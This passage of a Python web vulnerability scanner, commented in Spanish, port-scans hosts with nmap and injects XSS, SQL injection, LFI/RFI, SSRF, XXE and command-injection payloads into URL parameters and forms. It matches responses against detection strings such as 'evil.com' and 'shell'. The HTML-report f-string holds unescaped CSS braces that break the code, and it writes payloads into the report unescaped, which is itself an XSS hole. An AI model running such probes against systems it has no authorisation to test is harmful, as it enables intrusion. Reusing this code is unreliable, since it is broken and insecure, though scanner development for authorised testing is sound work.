                        form_info['inputs'].append(input_info)
                    
                    # Añadir formulario solo si tiene inputs
                    if form_info['inputs']:
                        self.forms.append(form_info)
                        
                        if self.config.get("general", "verbose"):
                            logger.info(f"Formulario encontrado en {url}")
                
                # Actualizar la barra de progreso
                if self.progress_bar:
                    self.progress_bar.update(1)
                    
            except Exception as e:
                logger.debug(f"Error al extraer formularios de {url}: {str(e)}")
    
    def port_scan(self):
        """Realiza un escaneo básico de puertos."""
        try:
            scanner = nmap.PortScanner()
            target = self.base_url
            
            # Escaneo de puertos comunes
            common_ports = "21,22,23,25,53,80,110,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,8080,8443"
            
            print(f"{Fore.BLUE}[+] Escaneando puertos comunes en {target}...")
            scanner.scan(target, common_ports)
            
            for host in scanner.all_hosts():
                print(f"{Fore.BLUE}[+] Host: {host}")
                for proto in scanner[host].all_protocols():
                    lport = sorted(scanner[host][proto].keys())
                    for port in lport:
                        state = scanner[host][proto][port]['state']
                        service = scanner[host][proto][port]['name']
                        print(f"{Fore.BLUE}  - Puerto {port}/{proto}: {state} ({service})")
                        
                        # Añadir a vulnerabilidades si es un servicio inseguro o inusual
                        if (state == 'open' and port not in [80, 443, 8080, 8443] and 
                            service not in ['http', 'https']):
                            self.vulnerabilities.append({
                                'type': 'Puerto potencialmente inseguro',
                                'details': f"Puerto {port}/{proto} ({service}) abierto",
                                'severity': 'Media' if port in [21, 23, 3389] else 'Baja'
                            })
        
        except Exception as e:
            logger.error(f"Error durante el escaneo de puertos: {str(e)}")
            print(f"{Fore.RED}[!] Error durante el escaneo de puertos: {str(e)}")
    
    def check_url_vulnerabilities(self, url):
        """Analiza vulnerabilidades en una URL específica."""
        try:
            # Verificar qué pruebas están habilitadas
            if self.config.get("scan", "xss"):
                self.check_xss(url)
            
            if self.config.get("scan", "sqli"):
                self.check_sqli(url)
            
            if self.config.get("scan", "lfi"):
                self.check_lfi(url)
            
            if self.config.get("scan", "rfi"):
                self.check_rfi(url)
            
            if self.config.get("scan", "open_redirect"):
                self.check_open_redirect(url)
            
            if self.config.get("scan", "ssrf"):
                self.check_ssrf(url)
            
            if self.config.get("scan", "xxe"):
                self.check_xxe(url)
            
            if self.config.get("scan", "command_injection"):
                self.check_command_injection(url)
            
            # Actualizar progreso
            if self.progress_bar:
                self.progress_bar.update(1)
        
        except Exception as e:
            logger.debug(f"Error al analizar vulnerabilidades en {url}: {str(e)}")
    
    def check_form_vulnerabilities(self, form):
        """Analiza vulnerabilidades en un formulario."""
        try:
            # Verificar qué pruebas están habilitadas
            if self.config.get("scan", "xss"):
                self.check_form_xss(form)
            
            if self.config.get("scan", "sqli"):
                self.check_form_sqli(form)
            
            if self.config.get("scan", "csrf"):
                self.check_csrf(form)
            
            if self.config.get("scan", "command_injection"):
                self.check_form_command_injection(form)
            
            # Actualizar progreso
            if self.progress_bar:
                self.progress_bar.update(1)
        
        except Exception as e:
            logger.debug(f"Error al analizar formulario: {str(e)}")
    
    def check_xss(self, url):
        """Busca vulnerabilidades XSS en parámetros de URL."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return
        
        for param_name, param_values in params.items():
            for payload in Payloads.XSS:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, test_query, parsed.fragment
                ))
                
                try:
                    response = self.request_manager.get(test_url, allow_redirects=True, cache=False)
                    
                    if payload in response.text:
                        self._add_vulnerability({
                            'type': 'XSS (Reflejado)',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f"Payload reflejado en la respuesta",
                            'severity': 'Alta'
                        })
                        return  # Encontrada una vulnerabilidad, no seguir probando
                
                except Exception as e:
                    logger.debug(f"Error al probar XSS en {url}: {str(e)}")
    
    def check_form_xss(self, form):
        """Busca vulnerabilidades XSS en formularios."""
        for input_field in form['inputs']:
            if input_field['type'] not in ['submit', 'button', 'image', 'hidden', 'checkbox', 'radio']:
                for payload in Payloads.XSS:
                    # Preparar datos del formulario
                    data = self._prepare_form_data(form, input_field['name'], payload)
                    
                    try:
                        if form['method'] == 'post':
                            response = self.request_manager.post(form['action'], data=data, cache=False)
                        else:
                            response = self.request_manager.get(form['action'], params=data, cache=False)
                        
                        if payload in response.text:
                            self._add_vulnerability({
                                'type': 'XSS (Formulario)',
                                'url': form['source_url'],
                                'form_action': form['action'],
                                'parameter': input_field['name'],
                                'payload': payload,
                                'severity': 'Alta'
                            })
                            return  # Encontrada una vulnerabilidad, no seguir probando
                    
                    except Exception as e:
                        logger.debug(f"Error al probar XSS en formulario {form['action']}: {str(e)}")
    
    def check_sqli(self, url):
        """Busca vulnerabilidades de inyección SQL en parámetros de URL."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return
        
        for param_name, param_values in params.items():
            for payload in Payloads.SQL_INJECTION:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, test_query, parsed.fragment
                ))
                
                try:
                    start_time = time.time()
                    response = self.request_manager.get(test_url, cache=False)
                    elapsed_time = time.time() - start_time
                    
                    # Detección basada en errores
                    for pattern in Payloads.SQL_ERROR_PATTERNS:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self._add_vulnerability({
                                'type': 'SQL Injection (Error)',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f"Patrón de error SQL detectado: {pattern}",
                                'severity': 'Alta'
                            })
                            return
                    
                    # Detección basada en tiempo
                    if 'SLEEP' in payload and elapsed_time > 2.5:
                        self._add_vulnerability({
                            'type': 'SQL Injection (Time-based)',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f"Retraso de {elapsed_time:.2f} segundos detectado",
                            'severity': 'Alta'
                        })
                        return
                
                except Exception as e:
                    logger.debug(f"Error al probar SQL Injection en {url}: {str(e)}")
    
    def check_form_sqli(self, form):
        """Busca vulnerabilidades de inyección SQL en formularios."""
        for input_field in form['inputs']:
            if input_field['type'] not in ['submit', 'button', 'image', 'hidden', 'checkbox', 'radio']:
                for payload in Payloads.SQL_INJECTION:
                    # Preparar datos del formulario
                    data = self._prepare_form_data(form, input_field['name'], payload)
                    
                    try:
                        start_time = time.time()
                        
                        if form['method'] == 'post':
                            response = self.request_manager.post(form['action'], data=data, cache=False)
                        else:
                            response = self.request_manager.get(form['action'], params=data, cache=False)
                        
                        elapsed_time = time.time() - start_time
                        
                        # Detección basada en errores
                        for pattern in Payloads.SQL_ERROR_PATTERNS:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                self._add_vulnerability({
                                    'type': 'SQL Injection (Formulario/Error)',
                                    'url': form['source_url'],
                                    'form_action': form['action'],
                                    'parameter': input_field['name'],
                                    'payload': payload,
                                    'evidence': f"Patrón de error SQL detectado: {pattern}",
                                    'severity': 'Alta'
                                })
                                return
                        
                        # Detección basada en tiempo
                        if 'SLEEP' in payload and elapsed_time > 2.5:
                            self._add_vulnerability({
                                'type': 'SQL Injection (Formulario/Time-based)',
                                'url': form['source_url'],
                                'form_action': form['action'],
                                'parameter': input_field['name'],
                                'payload': payload,
                                'evidence': f"Retraso de {elapsed_time:.2f} segundos detectado",
                                'severity': 'Alta'
                            })
                            return
                    
                    except Exception as e:
                        logger.debug(f"Error al probar SQL Injection en formulario {form['action']}: {str(e)}")
    
    def check_lfi(self, url):
        """Busca vulnerabilidades de Local File Inclusion."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return
        
        for param_name, param_values in params.items():
            # Parámetros sospechosos prioritarios
            if any(x in param_name.lower() for x in ['file', 'path', 'include', 'require', 'doc', 'document']):
                for payload in Payloads.LOCAL_FILE_INCLUSION:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, test_query, parsed.fragment
                    ))
                    
                    try:
                        response = self.request_manager.get(test_url, cache=False)
                        
                        for pattern in Payloads.LFI_PATTERNS:
                            if re.search(pattern, response.text):
                                self._add_vulnerability({
                                    'type': 'Local File Inclusion',
                                    'url': url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'evidence': f"Patrón LFI detectado: {pattern}",
                                    'severity': 'Alta'
                                })
                                return
                    
                    except Exception as e:
                        logger.debug(f"Error al probar LFI en {url}: {str(e)}")
    
    def check_rfi(self, url):
        """Busca vulnerabilidades de Remote File Inclusion."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return
        
        for param_name, param_values in params.items():
            # Parámetros sospechosos prioritarios
            if any(x in param_name.lower() for x in ['file', 'url', 'path', 'include', 'require', 'doc']):
                for payload in Payloads.REMOTE_FILE_INCLUSION:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, test_query, parsed.fragment
                    ))
                    
                    try:
                        response = self.request_manager.get(test_url, cache=False)
                        
                        # Buscar evidencias de inclusión remota exitosa
                        suspicious_terms = ['<?php', '<\\?php', 'shell', 'exec', 'eval', 'system']
                        for term in suspicious_terms:
                            if re.search(term, response.text, re.IGNORECASE):
                                self._add_vulnerability({
                                    'type': 'Remote File Inclusion',
                                    'url': url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'evidence': f"Posible inclusión remota detectada: '{term}'",
                                    'severity': 'Crítica'
                                })
                                return
                    
                    except Exception as e:
                        logger.debug(f"Error al probar RFI en {url}: {str(e)}")
    
    def check_open_redirect(self, url):
        """Busca vulnerabilidades de Open Redirect."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return
        
        redirect_params = ['redirect', 'url', 'return', 'next', 'redir', 'r', 'destination']
        
        for param_name, param_values in params.items():
            if param_name.lower() in redirect_params or any(x in param_name.lower() for x in redirect_params):
                for payload in Payloads.OPEN_REDIRECT:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, test_query, parsed.fragment
                    ))
                    
                    try:
                        response = self.request_manager.get(test_url, allow_redirects=False, cache=False)
                        
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            
                            if 'evil.com' in location or 'javascript:' in location:
                                self._add_vulnerability({
                                    'type': 'Open Redirect',
                                    'url': url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'evidence': f"Redirección a {location}",
                                    'severity': 'Media'
                                })
                                return
                    
                    except Exception as e:
                        logger.debug(f"Error al probar Open Redirect en {url}: {str(e)}")
    
    def check_ssrf(self, url):
        """Busca vulnerabilidades de Server-Side Request Forgery."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return
        
        for param_name, param_values in params.items():
            if any(x in param_name.lower() for x in ['url', 'uri', 'api', 'endpoint', 'site', 'path', 'dest']):
                for payload in Payloads.SSRF:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urllib.parse.urlencode(test_params, doseq=True)
                    
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, test_query, parsed.fragment
                    ))
                    
                    try:
                        response = self.request_manager.get(test_url, cache=False)
                        
                        # Detectar respuestas que sugieren SSRF exitoso
                        ssrf_patterns = [
                            "metadata", "ami-id", "local", "host", "internal", "private", 
                            "instance", "filesystem", "file system"
                        ]
                        
                        for pattern in ssrf_patterns:
                            if pattern in response.text.lower():
                                self._add_vulnerability({
                                    'type': 'SSRF',
                                    'url': url,
                                    'parameter': param_name,

                                    'payload': payload,
                                    'evidence': f"Patrón SSRF detectado: '{pattern}'",
                                    'severity': 'Alta'
                                })
                                return
                    
                    except Exception as e:
                        logger.debug(f"Error al probar SSRF en {url}: {str(e)}")
    
    def check_xxe(self, url):
        """Busca vulnerabilidades de XML External Entity (XXE)."""
        # Detectar endpoints que puedan procesar XML
        if url.endswith(('.xml', '.soap')) or 'xml' in url or 'soap' in url:
            for payload in Payloads.XXE:
                headers = {'Content-Type': 'application/xml'}
                
                try:
                    response = self.request_manager.post(url, data=payload, headers=headers, cache=False)
                    
                    for pattern in Payloads.XXE_PATTERNS:
                        if re.search(pattern, response.text):
                            self._add_vulnerability({
                                'type': 'XML External Entity (XXE)',
                                'url': url,
                                'payload': payload,
                                'evidence': f"Patrón XXE detectado: {pattern}",
                                'severity': 'Alta'
                            })
                            return
                
                except Exception as e:
                    logger.debug(f"Error al probar XXE en {url}: {str(e)}")
    
    def check_command_injection(self, url):
        """Busca vulnerabilidades de inyección de comandos."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if not params:
            return
        
        for param_name, param_values in params.items():
            for payload in Payloads.COMMAND_INJECTION:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                
                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, test_query, parsed.fragment
                ))
                
                try:
                    response = self.request_manager.get(test_url, cache=False)
                    
                    for pattern in Payloads.COMMAND_EXEC_PATTERNS:
                        if re.search(pattern, response.text):
                            self._add_vulnerability({
                                'type': 'Command Injection',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'evidence': f"Patrón de ejecución de comandos detectado: {pattern}",
                                'severity': 'Crítica'
                            })
                            return
                
                except Exception as e:
                    logger.debug(f"Error al probar Command Injection en {url}: {str(e)}")
    
    def check_form_command_injection(self, form):
        """Busca vulnerabilidades de inyección de comandos en formularios."""
        for input_field in form['inputs']:
            if input_field['type'] not in ['submit', 'button', 'image', 'hidden', 'checkbox', 'radio']:
                for payload in Payloads.COMMAND_INJECTION:
                    # Preparar datos del formulario
                    data = self._prepare_form_data(form, input_field['name'], payload)
                    
                    try:
                        if form['method'] == 'post':
                            response = self.request_manager.post(form['action'], data=data, cache=False)
                        else:
                            response = self.request_manager.get(form['action'], params=data, cache=False)
                        
                        for pattern in Payloads.COMMAND_EXEC_PATTERNS:
                            if re.search(pattern, response.text):
                                self._add_vulnerability({
                                    'type': 'Command Injection (Formulario)',
                                    'url': form['source_url'],
                                    'form_action': form['action'],
                                    'parameter': input_field['name'],
                                    'payload': payload,
                                    'evidence': f"Patrón de ejecución de comandos detectado: {pattern}",
                                    'severity': 'Crítica'
                                })
                                return
                    
                    except Exception as e:
                        logger.debug(f"Error al probar Command Injection en formulario {form['action']}: {str(e)}")
    
    def check_csrf(self, form):
        """Verifica la protección CSRF en formularios."""
        # No verificar formularios GET, ya que no deberían modificar datos
        if form['method'] != 'post':
            return
        
        try:
            # Obtener el formulario original
            response = self.request_manager.get(form['source_url'], cache=False)
            
            # Buscar tokens CSRF comunes en inputs
            has_csrf_token = False
            
            for input_field in form['inputs']:
                if any(token_name in input_field['name'].lower() for token_name in 
                       ['csrf', 'token', 'nonce', '_token', 'authenticity']):
                    has_csrf_token = True
                    break
            
            # Buscar cabeceras de protección CSRF
            has_csrf_header = 'X-CSRF-Token' in response.headers or 'X-XSRF-Token' in response.headers
            
            # Buscar cookies SameSite
            has_samesite = False
            for cookie in response.cookies:
                if hasattr(cookie, 'samesite') and cookie.samesite in ['Strict', 'Lax']:
                    has_samesite = True
                    break
            
            if not (has_csrf_token or has_csrf_header or has_samesite):
                self._add_vulnerability({
                    'type': 'CSRF (Posible)',
                    'url': form['source_url'],
                    'form_action': form['action'],
                    'evidence': "No se detectaron mecanismos anti-CSRF (tokens, headers o SameSite cookies)",
                    'severity': 'Media'
                })
        
        except Exception as e:
            logger.debug(f"Error al verificar CSRF en formulario {form['source_url']}: {str(e)}")
    
    def _prepare_form_data(self, form, target_input_name, payload):
        """Prepara datos para enviar a un formulario con un payload específico."""
        data = {}
        
        for input_field in form['inputs']:
            if input_field['name'] == target_input_name:
                data[input_field['name']] = payload
            elif input_field['name']:
                # Usar valores por defecto para otros campos según su tipo
                if input_field['type'] == 'email':
                    data[input_field['name']] = 'test@example.com'
                elif input_field['type'] == 'number':
                    data[input_field['name']] = '1'
                elif input_field['type'] == 'password':
                    data[input_field['name']] = 'Password123!'
                elif input_field['type'] == 'url':
                    data[input_field['name']] = 'https://example.com'
                elif input_field['type'] == 'checkbox':
                    data[input_field['name']] = 'on'
                else:
                    data[input_field['name']] = input_field['value'] or 'testvalue'
        
        return data
    
    def _add_vulnerability(self, vuln):
        """Añade una vulnerabilidad a la lista y reporta."""
        self.vulnerabilities.append(vuln)
        
        # Imprimir en consola según la severidad
        severity = vuln.get('severity', 'Media')
        if severity == 'Crítica':
            color = Fore.RED + Style.BRIGHT
        elif severity == 'Alta':
            color = Fore.RED
        elif severity == 'Media':
            color = Fore.YELLOW
        else:
            color = Fore.WHITE
        
        print(f"{color}[!] {vuln['type']} encontrado en {vuln.get('url', vuln.get('form_action', 'N/A'))}")
        
        if self.config.get("general", "verbose"):
            if 'parameter' in vuln:
                print(f"{color}    Parámetro: {vuln['parameter']}")
            if 'payload' in vuln:
                print(f"{color}    Payload: {vuln['payload']}")
            if 'evidence' in vuln:
                print(f"{color}    Evidencia: {vuln['evidence']}")
    
    def print_summary(self, elapsed_time):
        """Imprime un resumen de los resultados del escaneo."""
        print("\n" + "="*70)
        print(f"{Fore.CYAN}[+] Escaneo completado en {elapsed_time:.2f} segundos")
        print(f"{Fore.CYAN}[+] URLs analizadas: {len(self.discovered_urls)}")
        print(f"{Fore.CYAN}[+] Formularios analizados: {len(self.forms)}")
        print(f"{Fore.CYAN}[+] Vulnerabilidades encontradas: {len(self.vulnerabilities)}")
        
        if self.vulnerabilities:
            print("\n" + "="*70)
            print(f"{Fore.RED}[!] VULNERABILIDADES ENCONTRADAS:")
            
            # Agrupar por tipo
            vuln_types = {}
            for vuln in self.vulnerabilities:
                vuln_type = vuln['type']
                if vuln_type not in vuln_types:
                    vuln_types[vuln_type] = []
                vuln_types[vuln_type].append(vuln)
            
            # Mostrar resumen por tipo y severidad
            for vuln_type, vulns in vuln_types.items():
                severity_counts = {'Crítica': 0, 'Alta': 0, 'Media': 0, 'Baja': 0}
                for v in vulns:
                    severity_counts[v.get('severity', 'Media')] += 1
                
                crit = severity_counts['Crítica']
                high = severity_counts['Alta']
                med = severity_counts['Media']
                low = severity_counts['Baja']
                
                color = Fore.RED if crit > 0 else (Fore.RED if high > 0 else (Fore.YELLOW if med > 0 else Fore.WHITE))
                
                print(f"\n{color}[!] {vuln_type}: {len(vulns)} encontradas")
                if crit > 0:
                    print(f"{color}    Críticas: {crit}")
                if high > 0:
                    print(f"{color}    Altas: {high}")
                if med > 0:
                    print(f"{color}    Medias: {med}")
                if low > 0:
                    print(f"{color}    Bajas: {low}")
                
                for i, vuln in enumerate(vulns, 1):
                    print(f"  {i}. {Fore.YELLOW}URL: {vuln.get('url') or vuln.get('form_action')}")
                    if 'parameter' in vuln:
                        print(f"     {Fore.YELLOW}Parámetro: {vuln['parameter']}")
                    if 'payload' in vuln and self.config.get("general", "verbose"):
                        print(f"     {Fore.YELLOW}Payload: {vuln['payload']}")
                    print(f"     {Fore.YELLOW}Severidad: {vuln['severity']}")
    
    def save_results(self):
        """Guarda los resultados del escaneo en diferentes formatos."""
        try:
            # Crear nombre base para archivos de salida
            timestamp = self.scan_stats["start_time"].strftime("%Y%m%d_%H%M%S")
            safe_target = self.base_url.replace(":", "_").replace("/", "_").replace(".", "_")
            base_filename = self.output_dir / f"scan_{safe_target}_{timestamp}"
        
            # Preparar datos para el informe
            report_data = {
                "target": self.target_url,
                "scan_date": self.scan_stats["start_time"].strftime("%Y-%m-%d %H:%M:%S"),
                "stats": {
                    "start_time": self.scan_stats["start_time"],
                    "end_time": self.scan_stats["end_time"],
                    "duration": (self.scan_stats["end_time"] - self.scan_stats["start_time"]).total_seconds(),
                    "requests_sent": self.scan_stats["requests_sent"],
                    "urls_discovered": self.scan_stats["urls_discovered"],
                    "forms_analyzed": self.scan_stats["forms_analyzed"],
                    "vulnerabilities_found": self.scan_stats["vulnerabilities_found"]
                },
                "vulnerabilities": self.vulnerabilities,
                "urls": list(self.discovered_urls)
            }
        
            # Guardar como JSON si está configurado
            output_format = self.config.get("output", "format")
            if output_format in ["json", "all"]:
                try:
                    json_file = f"{base_filename}.json"
                    with open(json_file, 'w', encoding='utf-8') as f:
                        json.dump(report_data, f, indent=4, cls=DateTimeEncoder)
                
                    logger.info(f"Informe JSON guardado en: {json_file}")
                    print(f"{Fore.GREEN}[+] Informe JSON guardado en: {json_file}")
                except Exception as e:
                    logger.error(f"Error al guardar informe JSON: {str(e)}")
                    print(f"{Fore.RED}[!] Error al guardar informe JSON: {str(e)}")
        
            # Guardar como CSV si está configurado
            if output_format in ["csv", "all"]:
                try:
                    csv_file = f"{base_filename}.csv"
                    with open(csv_file, 'w', newline='', encoding='utf-8') as f:
                        writer = csv.writer(f)
                        writer.writerow(["Tipo", "URL", "Severidad", "Descripción", "Payload", "Detalles"])
                        
                        for vuln in self.vulnerabilities:
                            writer.writerow([
                                vuln.get("type", ""),
                                vuln.get("url", ""),
                                vuln.get("severity", ""),
                                vuln.get("description", ""),
                                vuln.get("payload", ""),
                                json.dumps(vuln.get("details", {}), cls=DateTimeEncoder)
                            ])
                    
                    logger.info(f"Informe CSV guardado en: {csv_file}")
                    print(f"{Fore.GREEN}[+] Informe CSV guardado en: {csv_file}")
                except Exception as e:
                    logger.error(f"Error al guardar informe CSV: {str(e)}")
                    print(f"{Fore.RED}[!] Error al guardar informe CSV: {str(e)}")
        
            # Guardar como HTML si está configurado
            if output_format in ["html", "all"]:
                try:
                    self._generate_html_report(base_filename, report_data)
                except Exception as e:
                    logger.error(f"Error al generar informe HTML: {str(e)}")
                    print(f"{Fore.RED}[!] Error al generar informe HTML: {str(e)}")
            
        except Exception as e:
            logger.error(f"Error al guardar resultados: {str(e)}")
            print(f"{Fore.RED}[!] Error al guardar resultados: {str(e)}")
    
    def _generate_html_report(self, base_filename, report_data):
        """
        Genera un reporte HTML con los resultados del escaneo.
        
        Args:
            base_filename: Nombre base para el archivo de salida
            report_data: Datos del reporte en formato diccionario
        """
        try:
            html_file = f"{base_filename}.html"
            
            # Formatear datos de tiempo
            start_time = report_data["stats"]["start_time"]
            if isinstance(start_time, datetime):
                start_time = start_time.strftime('%Y-%m-%d %H:%M:%S')
            else:
                start_time = str(start_time)
                
            end_time = report_data["stats"]["end_time"]
            if isinstance(end_time, datetime):
                end_time = end_time.strftime('%Y-%m-%d %H:%M:%S')
            else:
                end_time = str(end_time)
                
            # Duración como número simple
            duration = report_data["stats"]["duration"]
            
            # Generar HTML para vulnerabilidades
            vulnerabilities_html = ""
            if report_data["vulnerabilities"]:
                for i, vuln in enumerate(report_data["vulnerabilities"]):
                    severity_class = ""
                    severity = vuln.get("severity", "Media").lower()
                    if severity == "crítica":
                        severity_class = "vulnerability-critica"
                    elif severity == "alta":
                        severity_class = "vulnerability-alta"
                    elif severity == "media":
                        severity_class = "vulnerability-media"
                    else:
                        severity_class = "vulnerability-baja"
                    
                    # Obtener URL de la vulnerabilidad
                    vuln_url = vuln.get("url", vuln.get("form_action", "N/A"))
                    
                    # Preparar detalles para mostrar
                    details = {}
                    for key, value in vuln.items():
                        if key not in ["type", "url", "form_action", "severity", "evidence", "payload"]:
                            details[key] = value
                    
                    # Convertir detalles a JSON seguro
                    details_json = json.dumps(details, indent=2, ensure_ascii=False, cls=DateTimeEncoder)
                    
                    vulnerabilities_html += f"""
                    <div class="card mb-3 {severity_class}">
                        <div class="card-header">
                            <h5>#{i+1}: {vuln.get("type", "No Type")} ({vuln.get("severity", "Unknown")})</h5>
                        </div>
                        <div class="card-body">
                            <h6 class="card-subtitle mb-2 text-muted">URL: {vuln_url}</h6>
                            <p class="card-text"><strong>Payload:</strong> <code>{vuln.get("payload", "N/A")}</code></p>
                            <p class="card-text"><strong>Evidencia:</strong> {vuln.get("evidence", "N/A")}</p>
                            <div class="mt-3">
                                <strong>Detalles:</strong>
                                <pre class="bg-light p-2">{details_json}</pre>
                            </div>
                        </div>
                    </div>
                    """
            else:
                vulnerabilities_html = "<div class='alert alert-success'>No se encontraron vulnerabilidades</div>"
            
            # Generar HTML para URLs
            urls_html = "<ul class='list-group'>"
            for url in report_data["urls"]:
                urls_html += f"<li class='list-group-item'>{url}</li>"
            urls_html += "</ul>"
            
            # HTML template con Bootstrap styling
            html_content = f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reporte de Vulnerabilidades Web</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #34495e;
            --danger-color: #e74c3c;
            --warning-color: #f39c12;
            --success-color: #27ae60;
            --info-color: #3498db;
        }
        body { 
            background-color: #f8f9fa;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }
        .dashboard-header {
            background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
            color: white;
            padding: 2rem 0;
            margin-bottom: 2rem;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .stat-card {
            transition: transform 0.3s, box-shadow 0.3s;
            border: none;
            border-radius: 10px;
            overflow: hidden;
        }
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .vulnerability-critica {
            border-left: 4px solid var(--danger-color);
            background-color: rgba(231, 76, 60, 0.1);
        }
        .vulnerability-alta {
            border-left: 4px solid var(--warning-color);
            background-color: rgba(243, 156, 18, 0.1);
        }
        .vulnerability-media {
            border-left: 4px solid var(--success-color);
            background-color: rgba(39, 174, 96, 0.1);
        }
        .vulnerability-baja {
            border-left: 4px solid var(--info-color);
            background-color: rgba(52, 152, 219, 0.1);
        }
        .scan-info {
            background-color: white;
            padding: 1.5rem;
            border-radius: 10px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        pre {
            background-color: #f8f9fa;
            border-radius: 5px;
            padding: 1rem;
            white-space: pre-wrap;
        }
        .chart-container {
            position: relative;
            height: 300px;
            margin-bottom: 2rem;
        }
        .url-list {
            max-height: 400px;
            overflow-y: auto;
            scrollbar-width: thin;
        }
        .url-list::-webkit-scrollbar {
            width: 6px;
        }
        .url-list::-webkit-scrollbar-track {
            background: #f1f1f1;
        }
        .url-list::-webkit-scrollbar-thumb {
            background: #888;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div class="container-fluid">
        <div class="dashboard-header text-center">
            <h1 class="display-4"><i class="fas fa-shield-alt"></i> Reporte de Vulnerabilidades Web</h1>
            <p class="lead">URL Analizada: {report_data["target"]}</p>
            <p><i class="fas fa-clock"></i> {report_data.get("scan_date", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}</p>
        </div>
        
        <div class="scan-info">
            <h4>Información del Escaneo</h4>
            <table class="table table-sm">
                <tr><td>Hora de inicio:</td><td>{start_time}</td></tr>
                <tr><td>Hora de finalización:</td><td>{end_time}</td></tr>
                <tr><td>Duración:</td><td>{duration:.2f} segundos</td></tr>
                <tr><td>Requests enviados:</td><td>{report_data["stats"]["requests_sent"]}</td></tr>
                <tr><td>URLs descubiertas:</td><td>{report_data["stats"]["urls_discovered"]}</td></tr>
                <tr><td>Formularios analizados:</td><td>{report_data["stats"]["forms_analyzed"]}</td></tr>
                <tr><td>Vulnerabilidades encontradas:</td><td>{report_data["stats"]["vulnerabilities_found"]}</td></tr>
            </table>
        </div>
        
        <h2>Vulnerabilidades Encontradas</h2>
        {vulnerabilities_html}
        
        <hr>
        <h2>URLs Descubiertas</h2>
        <div class="urls-list">
            {urls_html}
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
"""
            
            # Escribir el archivo
            with open(html_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            logger.info(f"Informe HTML guardado en: {html_file}")
            print(f"{Fore.GREEN}[+] Informe HTML guardado en: {html_file}")
            
        except Exception as e:
            logger.error(f"Error al generar informe HTML: {str(e)}")
            print(f"{Fore.RED}[!] Error al generar informe HTML: {str(e)}")



class VulnScannerConsole(cmd.Cmd):
    """Consola interactiva para WebVulnScanner."""
    
    intro = f'''
{Fore.CYAN}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
